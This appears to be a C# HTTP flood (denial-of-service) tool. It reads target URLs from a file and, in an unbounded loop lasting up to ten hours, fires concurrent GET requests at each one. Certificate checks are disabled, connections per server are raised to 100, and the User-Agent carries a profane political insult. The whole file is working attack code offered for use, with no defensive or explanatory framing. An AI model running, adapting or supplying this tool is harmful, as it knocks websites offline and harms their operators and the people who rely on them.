using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

string filename = args[0];
Console.WriteLine($"--> reading urls from {filename}");
string?[] urls = File.ReadAllLines(filename);

List<Task> tasks = new List<Task>();
CancellationTokenSource cts = new CancellationTokenSource();
cts.CancelAfter(TimeSpan.FromHours(10)); // cancel after 5 seconds
int cycle = 0;
while (!cts.IsCancellationRequested)
{
    foreach (string? url in urls)
    {
        tasks.Add(Task.Run(async () =>
        {
            HttpClientHandler clientHandler = new HttpClientHandler()
            {
                ServerCertificateCustomValidationCallback = (_, _, _, _) => { return true; },
                AllowAutoRedirect = true,
                MaxConnectionsPerServer = 100,
                UseCookies = true,
                CookieContainer = new CookieContainer(25),
                PreAuthenticate = true,
                MaxResponseHeadersLength = 48
            };
            using HttpClient client = new HttpClient(clientHandler);
            client.Timeout = TimeSpan.FromSeconds(60);
            try
            {
                client.DefaultRequestHeaders.Add("UserAgent", "PUTIN PIDARAS");
                HttpResponseMessage resp = await client.GetAsync(url, cts.Token);
                // Check the response status code
                if (resp.StatusCode == HttpStatusCode.OK)
                {
                    Console.WriteLine($"{url} : {resp.StatusCode}");
                }
                else
                {
                    Console.WriteLine($"{url} : {resp.StatusCode} ({resp.ReasonPhrase})");
                }
            }
            catch (Exception ex)
            {
                // ignored
                Console.WriteLine($"{url} : {ex.Message}");
            }
        }));
    }

    var results = Task.WhenAll(tasks.ToArray()).ConfigureAwait(false);
    results.GetAwaiter().OnCompleted(() => { Console.WriteLine($"Completed, CYCLE {cycle++}"); });
    tasks.Clear();
}

// Dispose the CancellationTokenSource
// cts.Dispose();
Console.WriteLine(">> Done");